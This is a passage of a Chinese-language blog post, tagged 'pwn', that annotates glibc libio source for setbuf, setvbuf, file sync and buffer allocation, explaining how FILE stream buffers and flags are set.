class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">865</span> <span class="meta">#<span class="keyword">ifdef</span> IO_DEBUG</span></span><br><span class="line"><span class="number">866</span> <span class="meta"># <span class="keyword">define</span> CHECK_FILE(FILE, RET) do &#123;             \                                                                                                    </span></span><br><span class="line"><span class="number">867</span>     <span class="keyword">if</span> ((FILE) == <span class="literal">NULL</span>                      \</span><br><span class="line"><span class="number">868</span>     || ((FILE)-&gt;_flags &amp; _IO_MAGIC_MASK) != _IO_MAGIC)  \</span><br><span class="line"><span class="number">869</span>       &#123;                             \</span><br><span class="line"><span class="number">870</span>     __set_errno (EINVAL);                   \</span><br><span class="line"><span class="number">871</span>     <span class="keyword">return</span> RET;                     \</span><br><span class="line"><span class="number">872</span>       &#125;                             \</span><br><span class="line"><span class="number">873</span>   &#125; <span class="keyword">while</span> (<span class="number">0</span>)</span><br><span class="line"><span class="number">874</span> <span class="meta">#<span class="keyword">else</span> </span></span><br><span class="line"><span class="number">875</span> <span class="meta"># <span class="keyword">define</span> CHECK_FILE(FILE, RET) do &#123; &#125; while (0)</span></span><br><span class="line"><span class="number">876</span> <span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure><h3 id="2-sync"><a href="#2-sync" class="headerlink" title="2.sync"></a>2.sync</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_new_file_sync (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">ssize_t</span> delta;</span><br><span class="line">  <span class="type">int</span> retval = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*    char* ptr = cur_ptr(); */</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)</span><br><span class="line">    <span class="keyword">if</span> (_IO_do_flush(fp)) <span class="keyword">return</span> EOF;</span><br><span class="line">  delta = fp-&gt;_IO_read_ptr - fp-&gt;_IO_read_end;</span><br><span class="line">  <span class="keyword">if</span> (delta != <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">off64_t</span> new_pos = _IO_SYSSEEK (fp, delta, <span class="number">1</span>);</span><br><span class="line">      <span class="keyword">if</span> (new_pos != (<span class="type">off64_t</span>) EOF)</span><br><span class="line">fp-&gt;_IO_read_end = fp-&gt;_IO_read_ptr;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> (errno == ESPIPE)</span><br><span class="line">; <span class="comment">/* Ignore error from unseekable devices. */</span></span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">retval = EOF;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (retval != EOF)</span><br><span class="line">    fp-&gt;_offset = _IO_pos_BAD;</span><br><span class="line">  <span class="comment">/* <span class="doctag">FIXME:</span> Cleanup - can this be shared? */</span></span><br><span class="line">  <span class="comment">/*    setg(base(), ptr, ptr); */</span></span><br><span class="line">  <span class="keyword">return</span> retval;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_ver (_IO_new_file_sync, _IO_file_sync)</span><br></pre></td></tr></table></figure><p>write缓冲区中如果有数据未写入</p><p>调用_IO_do_flush(fp)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_do_flush(_f) \</span></span><br><span class="line"><span class="meta">  ((_f)-&gt;_mode &lt;= 0      \</span></span><br><span class="line"><span class="meta">   ? _IO_do_write(_f, (_f)-&gt;_IO_write_base,      \</span></span><br><span class="line"><span class="meta">  (_f)-&gt;_IO_write_ptr-(_f)-&gt;_IO_write_base)      \</span></span><br><span class="line"><span class="meta">   : _IO_wdo_write(_f, (_f)-&gt;_wide_data-&gt;_IO_write_base,      \</span></span><br><span class="line"><span class="meta">   ((_f)-&gt;_wide_data-&gt;_IO_write_ptr      \</span></span><br><span class="line"><span class="meta">    - (_f)-&gt;_wide_data-&gt;_IO_write_base)))</span></span><br></pre></td></tr></table></figure><h1 id="setbuf"><a href="#setbuf" class="headerlink" title="setbuf"></a>setbuf</h1><p>setbuf指定对应文件流 stream 的 IO 操作 buffer，此时该 stream 就一定是使用缓存 buffer 的，或者如果 buffer 指针为 NULL，那么此时的 stream 会被禁用缓存 buffer。</p><ul><li>使用缓存 buffer：读写文件时的信息并不是与文件完全相同的，只有当调用了 fflush 函数才会将缓存 buffer 中的信息同步到文件中；</li><li>不使用缓存 buffer：那么写入的信息将会尽可能快地同步到文件中。</li></ul><blockquote><p>注意：<strong>buffer 的 size 大小有要求为 BUFSIZ</strong></p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">void setbuf ( FILE * stream, char * buffer );</span><br></pre></td></tr></table></figure><p>假设两个 FILE 对象，其中一个设置为 buffer，另一个设置为 no buffer，那么 pFile1 只有再调用 fflush(pFile1)之后信息才完全写入文件，而 pFile2 的信息是尽可能快地写入文件，不必使用 fflush，当然，最后 fclose 之后，buffer 中的信息都会同步到文件中.</p><p>setbuf位于libio/setbuf.c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">setbuf</span> <span class="params">(FILE *fp, <span class="type">char</span> *buf)</span></span><br><span class="line">&#123;</span><br><span class="line">  _IO_setbuffer (fp, buf, BUFSIZ);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>仅是调用 _IO_setbuffer,位于libio/iosetbuffer.c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">_IO_setbuffer (FILE *fp, <span class="type">char</span> *buf, <span class="type">size_t</span> size)<span class="comment">//size是不可控的</span></span><br><span class="line">&#123;</span><br><span class="line">  CHECK_FILE (fp, );<span class="comment">//检查fp是否有效</span></span><br><span class="line">  _IO_acquire_lock (fp);<span class="comment">//上锁</span></span><br><span class="line">  fp-&gt;_flags &amp;= ~_IO_LINE_BUF;<span class="comment">//将IO_LINE_BUF行缓冲标志设置为0</span></span><br><span class="line">  <span class="keyword">if</span> (!buf)<span class="comment">//参数为NULL</span></span><br><span class="line">    size = <span class="number">0</span>;</span><br><span class="line">  (<span class="type">void</span>) _IO_SETBUF (fp, buf, size);<span class="comment">//首先调用_IO_new_file_setbuf</span></span><br><span class="line">  <span class="keyword">if</span> (_IO_vtable_offset (fp) == <span class="number">0</span> &amp;&amp; fp-&gt;_mode == <span class="number">0</span> &amp;&amp; _IO_CHECK_WIDE (fp))</span><br><span class="line">    <span class="comment">/* We also have to set the buffer using the wide char function.  */</span></span><br><span class="line">    (<span class="type">void</span>) _IO_WSETBUF (fp, buf, size);<span class="comment">//宽字符额外设置,暂且不表</span></span><br><span class="line">  _IO_release_lock (fp);<span class="comment">//释放锁</span></span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (_IO_setbuffer)</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># <span class="keyword">define</span> CHECK_FILE(FILE, RET) do &#123;\</span></span><br><span class="line"><span class="meta">    <span class="keyword">if</span> ((FILE) == NULL\</span></span><br><span class="line"><span class="meta">|| ((FILE)-&gt;_flags &amp; _IO_MAGIC_MASK) != _IO_MAGIC)\</span></span><br><span class="line"><span class="meta">      &#123;\</span></span><br><span class="line"><span class="meta">__set_errno (EINVAL);\</span></span><br><span class="line"><span class="meta">return RET;\</span></span><br><span class="line"><span class="meta">      &#125;\</span></span><br><span class="line"><span class="meta">  &#125; while (0)</span></span><br></pre></td></tr></table></figure><h2 id="0x1-4"><a href="#0x1-4" class="headerlink" title="0x1"></a>0x1</h2><p>先看_IO_new_file_setbuf</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">FILE *</span><br><span class="line">_IO_new_file_setbuf (FILE *fp, <span class="type">char</span> *p, <span class="type">ssize_t</span> len)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (_IO_default_setbuf (fp, p, len) == <span class="literal">NULL</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">  fp-&gt;_IO_write_base = fp-&gt;_IO_write_ptr = fp-&gt;_IO_write_end</span><br><span class="line">    = fp-&gt;_IO_buf_base;<span class="comment">//修改w缓存指针</span></span><br><span class="line">  _IO_setg (fp, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base);<span class="comment">//设置r缓存指针</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> fp;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_ver (_IO_new_file_setbuf, _IO_file_setbuf)</span><br></pre></td></tr></table></figure><p>又先调用_IO_default_setbuf</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">FILE *</span><br><span class="line">_IO_default_setbuf (FILE *fp, <span class="type">char</span> *p, <span class="type">ssize_t</span> len)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (_IO_SYNC (fp) == EOF)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">if</span> (p == <span class="literal">NULL</span> || len == <span class="number">0</span>)</span><br><span class="line">      &#123;</span><br><span class="line">fp-&gt;_flags |= _IO_UNBUFFERED;<span class="comment">//设置nobuf</span></span><br><span class="line">_IO_setb (fp, fp-&gt;_shortbuf, fp-&gt;_shortbuf+<span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">fp-&gt;_flags &amp;= ~_IO_UNBUFFERED;<span class="comment">//取消nobuf标志</span></span><br><span class="line">_IO_setb (fp, p, p+len, <span class="number">0</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    fp-&gt;_IO_write_base = fp-&gt;_IO_write_ptr = fp-&gt;_IO_write_end = <span class="number">0</span>;</span><br><span class="line">    fp-&gt;_IO_read_base = fp-&gt;_IO_read_ptr = fp-&gt;_IO_read_end = <span class="number">0</span>;<span class="comment">//清空rw缓存指针</span></span><br><span class="line">    <span class="keyword">return</span> fp;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>_IO_setb (fp, fp-&gt;_shortbuf, fp-&gt;_shortbuf+1, 0);</p><p>_IO_setb (fp, p, p+len, 0);</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">_IO_setb (FILE *f, <span class="type">char</span> *b, <span class="type">char</span> *eb, <span class="type">int</span> a)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (f-&gt;_IO_buf_base &amp;&amp; !(f-&gt;_flags &amp; _IO_USER_BUF))<span class="comment">//如果文件流存在buffer且不是保留buf模式</span></span><br><span class="line">    <span class="built_in">free</span> (f-&gt;_IO_buf_base);</span><br><span class="line">  f-&gt;_IO_buf_base = b;</span><br><span class="line">  f-&gt;_IO_buf_end = eb;<span class="comment">//buf缓冲区设置</span></span><br><span class="line">  <span class="keyword">if</span> (a)</span><br><span class="line">    f-&gt;_flags &amp;= ~_IO_USER_BUF;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    f-&gt;_flags |= _IO_USER_BUF;<span class="comment">//使文件流关闭时不处理buf</span></span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (_IO_setb)</span><br></pre></td></tr></table></figure><p>总结就是修改缓冲区及相应标志位再重置rw指针</p><h1 id="setvbuf"><a href="#setvbuf" class="headerlink" title="setvbuf"></a>setvbuf</h1><p> setvbuf</p><p>改变文件流 buffer 函数</p><p>指定对应文件流 stream 的 IO 操作 buffer，同时设定该块缓存 buffer 的操作 mode 和 size 大小，如果 buffer 指针是空指针，那么 setvbuf 函数将会自动分配一块默认大小大小的 buffer 作为缓存使用。</p><p>只有buf不为null时,size才有效</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">int setvbuf ( FILE * stream, char * buffer, int mode, size_t size );</span><br></pre></td></tr></table></figure><blockquote><p>注意：上面的 mode 有以下的选择</p></blockquote><ul><li>_IOFBF：Full Buffering:<strong>输出操作中</strong>，数据在 buffer 写满后写入物理文件；<strong>输入操作中</strong>，buffer 只有在全为空时才被填写，填充的可能是多行数据；</li><li>_IOLBF：Line Buffering:<strong>输出操作中</strong>，数据在新的一行插入 FILE 流对象或 buffer 写满时触发写入物理文件；<strong>输入操作中</strong>，buffer 只有在 buffer 全为空时，写入新的一行到 buffer 中。</li><li>_IONBF：No Buffering:不使用缓存 buffer，所有输入输出操作都尽可能快地写入物理文件，当前模式下，buffer 和 size 参数将会被忽略</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* The possibilities for the third argument to `setvbuf&#x27;.  */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IOFBF 0<span class="comment">/* Fully buffered.  */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IOLBF 1<span class="comment">/* Line buffered.  */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IONBF 2<span class="comment">/* No buffering.  */</span></span></span><br></pre></td></tr></table></figure><blockquote><p>注意：setvbuf 的调用时机，在一个文件流对象绑定到一个打开的文件之后，对该文件流对象进行文件读写操作之前。</p></blockquote><p>可以看如下的例子：</p><p>打开了一个 pFIle 对象，并将其 buffer 设置为 NULL(函数内部将自动生成一块大小为 1024Byte 大小的 buffer)，mode 设置为_IOFBF。那么，在进行文件操作过程中，如向文件写入过程中，每写满 1024 字节才会触发一次将数据写入物理文件。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* setvbuf example */</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span> <span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  FILE *pFile;</span><br><span class="line"></span><br><span class="line">  pFile=fopen (<span class="string">&quot;myfile.txt&quot;</span>,<span class="string">&quot;w&quot;</span>);</span><br><span class="line"></span><br><span class="line">  setvbuf ( pFile , <span class="literal">NULL</span> , _IOFBF , <span class="number">1024</span> );</span><br><span class="line"></span><br><span class="line">  <span class="comment">// File operations here</span></span><br><span class="line"></span><br><span class="line">  fclose (pFile);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>setvbuf调用的是_IO_setvbuf<br>函数位于libio/iosetvbuf.c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_setvbuf (FILE *fp, <span class="type">char</span> *buf, <span class="type">int</span> mode, <span class="type">size_t</span> size)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> result;</span><br><span class="line">  CHECK_FILE (fp, EOF);<span class="comment">//同样的校验</span></span><br><span class="line">  _IO_acquire_lock (fp);<span class="comment">//同样的上锁</span></span><br><span class="line">  <span class="keyword">switch</span> (mode)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">case</span> _IOFBF:<span class="comment">//全缓冲</span></span><br><span class="line">      fp-&gt;_flags &amp;= ~(_IO_LINE_BUF|_IO_UNBUFFERED);<span class="comment">//置空行缓冲和无缓冲标志</span></span><br><span class="line">      <span class="keyword">if</span> (buf == <span class="literal">NULL</span>)<span class="comment">//未指定buffer地址</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_buf_base == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* There is no flag to distinguish between &quot;fully buffered</span></span><br><span class="line"><span class="comment"> mode has been explicitly set&quot; as opposed to &quot;line</span></span><br><span class="line"><span class="comment"> buffering has not been explicitly set&quot;.  In both</span></span><br><span class="line"><span class="comment"> cases, _IO_LINE_BUF is off.  If this is a tty, and</span></span><br><span class="line"><span class="comment"> _IO_filedoalloc later gets called, it cannot know if</span></span><br><span class="line"><span class="comment"> it should set the _IO_LINE_BUF flag (because that is</span></span><br><span class="line"><span class="comment"> the default), or not (because we have explicitly asked</span></span><br><span class="line"><span class="comment"> for fully buffered mode).  So we make sure a buffer</span></span><br><span class="line"><span class="comment"> gets allocated now, and explicitly turn off line</span></span><br><span class="line"><span class="comment"> buffering.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"> A possibly cleaner alternative would be to add an</span></span><br><span class="line"><span class="comment"> extra flag, but then flags are a finite resource.  */</span></span><br><span class="line">      <span class="keyword">if</span> (_IO_DOALLOCATE (fp) &lt; <span class="number">0</span>)<span class="comment">//为其分配一块内存</span></span><br><span class="line">&#123;</span><br><span class="line">  result = EOF;</span><br><span class="line">  <span class="keyword">goto</span> unlock_return;</span><br><span class="line">&#125;</span><br><span class="line">      fp-&gt;_flags &amp;= ~_IO_LINE_BUF;<span class="comment">//因为缓存分配函数默认会将行缓冲标志设为1,再次清空,可以看一下上面一大段英文</span></span><br><span class="line">    &#125;</span><br><span class="line">  result = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">goto</span> unlock_return;</span><br><span class="line">&#125;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> _IOLBF:</span><br><span class="line">      fp-&gt;_flags &amp;= ~_IO_UNBUFFERED;<span class="comment">//清空无缓冲标志</span></span><br><span class="line">      fp-&gt;_flags |= _IO_LINE_BUF;<span class="comment">//设置行缓冲模式</span></span><br><span class="line">      <span class="keyword">if</span> (buf == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">  result = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">goto</span> unlock_return;</span><br><span class="line">&#125;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> _IONBF:</span><br><span class="line">      fp-&gt;_flags &amp;= ~_IO_LINE_BUF;<span class="comment">//设置无缓冲标志</span></span><br><span class="line">      fp-&gt;_flags |= _IO_UNBUFFERED;<span class="comment">//清空行缓冲模式</span></span><br><span class="line">      buf = <span class="literal">NULL</span>;</span><br><span class="line">      size = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      result = EOF;</span><br><span class="line">      <span class="keyword">goto</span> unlock_return;</span><br><span class="line">    &#125;</span><br><span class="line">  result = _IO_SETBUF (fp, buf, size) == <span class="literal">NULL</span> ? EOF : <span class="number">0</span>;<span class="comment">//设置buf</span></span><br><span class="line"></span><br><span class="line">unlock_return:</span><br><span class="line">  _IO_release_lock (fp);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="0x1-IOFBF"><a href="#0x1-IOFBF" class="headerlink" title="0x1_IOFBF"></a>0x1_IOFBF</h2><ul><li>首先将_IO_LINE_BUF 和_IO_UNBUFFERED 位置为 0，因为目前是要求 full buffering 的；</li><li>然后我们检查输入参数 buf，如果为空的话，我们要尝试进行分配 buffer 分配；</li><li>再次我们检查 fp-&gt;_IO_buf_base 参数，这里指向的是 fp 预先分配的缓存 buffer，只有这里也为空，那就说明完全没有缓存 buffer 可用，那我们就真的需要进行分配了；</li><li>调用_IO_DOALLOCATE 对 fp 进行 buffer 分配</li><li>根据分配 buffer 是否失败决定是直接返回错误 EOF，还是重新只将_IO_LINE_BUF 置为 0</li><li><strong>注意了，上面都是 buf 为空，需要重新</strong></li><li><strong>分配的情况，如果 buf 不为空，那么我们会跳到</strong></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">result = _IO_SETBUF (fp, buf, size) == NULL ? EOF : 0;</span><br></pre></td></tr></table></figure><p><strong>的执行中，进行 buf 设置；如果 fp-&gt;_IO_buf_base 不等于 NULL，那我们实际上是默认使用这块 buffer 的，返回 0，退出函数</strong></p><p>看一下其中的doalloc函数,位于libio/filedoallocate.c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_file_doallocate (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> size;</span><br><span class="line">  <span class="type">char</span> *p;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">stat64</span> <span class="title">st</span>;</span></span><br><span class="line"></span><br><span class="line">  size = BUFSIZ;<span class="comment">//默认size</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_fileno &gt;= <span class="number">0</span> &amp;&amp; __builtin_expect (_IO_SYSSTAT (fp, &amp;st), <span class="number">0</span>) &gt;= <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (S_ISCHR (st.st_mode))</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* Possibly a tty.  */</span></span><br><span class="line">  <span class="keyword">if</span> (</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> DEV_TTY_P</span></span><br><span class="line">      DEV_TTY_P (&amp;st) ||</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">      local_isatty (fp-&gt;_fileno))</span><br><span class="line">    fp-&gt;_flags |= _IO_LINE_BUF;<span class="comment">//设置行缓冲</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined _STATBUF_ST_BLKSIZE</span></span><br><span class="line">      <span class="keyword">if</span> (st.st_blksize &gt; <span class="number">0</span> &amp;&amp; st.st_blksize &lt; BUFSIZ)</span><br><span class="line">size = st.st_blksize;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    &#125;</span><br><span class="line">  p = <span class="built_in">malloc</span> (size);<span class="comment">//申请</span></span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (p == <span class="literal">NULL</span>))</span><br><span class="line">    <span class="keyword">return</span> EOF;</span><br><span class="line">  _IO_setb (fp, p, p + size, <span class="number">1</span>);<span class="comment">//设置缓冲区</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (_IO_file_doallocate)</span><br></pre></td></tr></table></figure><p>这个函数的核心作用就是为 fp-&gt;_IO_buf_base 分配一块合理大小的 buffer 用作缓存，我们来看看它的一些具体逻辑：</p><ul><li>默认 size 大小是 size = BUFSIZ （8192 字节）</li><li>对 fp 指针状态进行设置，将_IO_LINE_BUF 置位；</li><li>通过获取该 IO 流的 stat 信息 st，决定是否有必要采用其中 st_blksize 更新 size(主要是考虑使用一个比 8192 更小的 size，分配足够的就行，不一定要最大的 size)</li><li>通过 malloc 分配对应大小的 buffer，然后调用_IO_setb 将 fp-&gt;_IO_buf_base 设置为刚才申请的地址</li></ul><h2 id="0x2-IOLBF"><a href="#0x2-IOLBF" class="headerlink" title="0x2_IOLBF"></a>0x2_IOLBF</h2><p>这种情况是按行使用 buffer，主要做了以下操作：</p><ul><li>设置 tag，将_IO_UNBUFFERED 置 0，将_IO_LINE_BUF 置位；</li><li>如果入参 buf 为空，那就直接返回 0，结束函数；否则等待执行_IO_SETBUF (fp, buf, size)</li></ul><p><strong>思考：这里为什么不重新检查 fp-&gt;_IO_buf_base 然后分配内存呢？</strong></p><p>从上一种情况中我们注意到，在分配 buffer 后我们都默认将_IO_LINE_BUF 置位，即这是一种默认模式，所以我们无需检查 fp-&gt;_IO_buf_base 的状态</p><h2 id="0x3-IONBUF"><a href="#0x3-IONBUF" class="headerlink" title="0x3_IONBUF"></a>0x3_IONBUF</h2><p>这种情况的操作就更为简单了，禁用了 buffer，我们将_IO_LINE_BUF 置 0，_IO_UNBUFFERED 置位，然后将入参 buf 置为 NULL，size 置为 0，等待调用_IO_SETBUF (fp, buf, size)</p>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习记录 </tag>
            
            <tag> _IO_FILE </tag>
            
        </tags>
      
    </entry>
    
    
    
